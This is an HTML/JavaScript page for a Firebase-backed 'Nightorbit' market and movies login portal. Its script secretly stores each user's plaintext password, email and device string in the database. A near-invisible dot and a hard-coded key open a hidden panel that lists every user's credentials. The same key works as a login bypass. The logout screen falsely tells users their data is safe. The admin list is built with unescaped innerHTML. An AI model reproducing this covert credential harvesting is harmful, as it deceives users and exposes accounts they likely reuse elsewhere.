<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nightorbit Elite - Full Version</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; padding: 0; width: 100%; height: 100vh; 
            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden;
        }

        /* Glassmorphism Card */
        .card { 
            background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(25px);
            padding: 40px; border-radius: 30px; text-align: center; 
            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); z-index: 10;
        }

        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--primary); background: rgba(0,0,0,0.4); color: white; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: 0.3s; }
        
        /* Links Styling */
        .link-card { background: rgba(255,255,255,0.07); padding: 15px; border-radius: 15px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; }
        .link-card:hover { background: rgba(255,255,255,0.15); transform: scale(1.03); }

        /* Secret Access */
        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); opacity: 0.5; z-index: 100; }
        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }

        /* Overlays */
        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 500; display: none; padding: 40px; overflow-y: auto; }
        #logout-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="logout-screen">
        <div style="font-size: 60px;">‚ú®</div>
        <h2 id="bye-msg" style="color: var(--primary); font-size: 24px; padding: 20px;"></h2>
    </div>

    <div id="admin-panel">
        <h1 style="color: var(--primary);">User Database Control</h1>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">Close Panel</button>
        <div id="user-display-list" style="margin-top: 30px;"></div>
    </div>

    <div class="menu-dots" onclick="masterBypass()">‚ãÆ</div>
    <div class="admin-dot" onclick="openAdminPanel()">.</div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; letter-spacing: 2px;">NIGHTORBIT</h1>
        <p style="color: #888; font-size: 13px;">Market & Movies Portal</p>
        <input type="email" id="email" placeholder="Email Address">
        <input type="password" id="pass" placeholder="Password">
        <button class="btn-main" onclick="emailAuth()">LOGIN / SIGNUP</button>
        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">SIGN-IN WITH GOOGLE</button>
    </div>

    <div id="content-box" class="card hidden">
        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
        <div style="text-align: left; margin-top: 20px;">
            <a href="https://www.daraz.pk" target="_blank" class="link-card">üõí Daraz Market <span>PK</span></a>
            <a href="https://www.amazon.com" target="_blank" class="link-card">üõçÔ∏è Global Store <span>US</span></a>
            <a href="YOUR_MOVIE_LINK" target="_blank" class="link-card" style="border-left-color: #00ff00;">üé¨ Download Movies <span style="background: green; padding: 2px 6px; border-radius: 4px; font-size: 10px;">PAISE</span></a>
        </div>
        <button onclick="startLogoutSequence()" style="margin-top: 30px; color: #ff4b2b; background: none; border: none; cursor: pointer; font-weight: bold;">Logout Safely</button>
    </div>

    <script>
        // Aapki Original Config
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.firebasestorage.app",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let activeUserName = "Member";

        // 1. MASTER BYPASS (3 Dots)
        function masterBypass() {
            if(prompt("Master Key:") === "rr123456789000rr") showDashboardUI("Admin Farooq");
        }

        // 2. ADMIN PANEL (One Dot)
        function openAdminPanel() {
            if (prompt("Admin Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', (snap) => {
                    let html = "";
                    snap.forEach(child => {
                        let u = child.val();
                        html += `<div style="background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border: 1px solid #333; text-align:left;">
                            <b style="color:var(--primary)">${u.savedName || 'No Name'}</b> | Pass: ${u.password}<br>
                            <small style="color:#666">${u.email}</small><br>
                            <button onclick="renameUser('${child.key}')" style="margin-top:10px; cursor:pointer;">Edit Display Name</button>
                        </div>`;
                    });
                    document.getElementById('user-display-list').innerHTML = html;
                });
            }
        }

        function renameUser(uid) {
            let n = prompt("Enter Custom Name:");
            if(n) db.ref('users/' + uid).update({ savedName: n });
        }

        // 3. AUTH LOGIC
        function googleAuth() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => handleUserData(res.user, "GoogleLogin"));
        }

        function emailAuth() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            auth.signInWithEmailAndPassword(e, p).then(res => handleUserData(res.user, p))
            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleUserData(res.user, p)));
        }

        function handleUserData(user, p) {
            db.ref('users/' + user.uid).once('value', (snap) => {
                const data = snap.val();
                activeUserName = data ? (data.savedName || user.displayName) : (user.displayName || "Elite User");
                
                db.ref('users/' + user.uid).update({
                    email: user.email,
                    password: p,
                    device: navigator.userAgent,
                    savedName: activeUserName,
                    lastLogin: new Date().toLocaleString()
                }).then(() => showDashboardUI(activeUserName));
            });
        }

        function showDashboardUI(name) {
            activeUserName = name;
            document.getElementById('login-box').classList.add('hidden');
            document.getElementById('content-box').classList.remove('hidden');
            document.getElementById('user-welcome').innerText = "Hello, " + name;
        }

        function startLogoutSequence() {
            const screen = document.getElementById('logout-screen');
            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${activeUserName}</b>!<br>Aapka data mehfooz hai.`;
            screen.style.display = 'flex';
            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4000);
        }

        // Check active login
        auth.onAuthStateChanged(user => { if(user) handleUserData(user, "SavedSession"); });
    </script>
</body>
</html>
